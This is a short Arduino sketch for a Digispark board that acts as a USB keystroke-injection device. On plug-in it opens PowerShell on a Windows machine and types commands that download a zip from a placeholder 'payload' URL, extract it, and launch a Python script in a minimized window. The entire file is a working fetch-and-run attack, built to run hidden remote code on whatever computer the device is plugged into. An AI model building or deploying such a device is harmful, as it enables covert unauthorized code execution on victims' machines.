#include "DigiKeyboard.h"

void setup() {

	DigiKeyboard.sendKeyStroke(0);
	DigiKeyboard.delay(500);
	DigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT);
	DigiKeyboard.delay(1000);
	DigiKeyboard.print("powershell");
	DigiKeyboard.delay(500);
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(1000);
	DigiKeyboard.println("wget https://embeddable-package-&-payload-URL/python-w32.zip -O python-w32.zip");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(500);
	DigiKeyboard.println("Expand-Archive -Force python-w32.zip -DestinationPath App");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(500);
	DigiKeyboard.println("cd App\\python-w32; Start-Process -WindowStyle Minimized .\\python app.py; exit");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	  
}

void loop() {

}
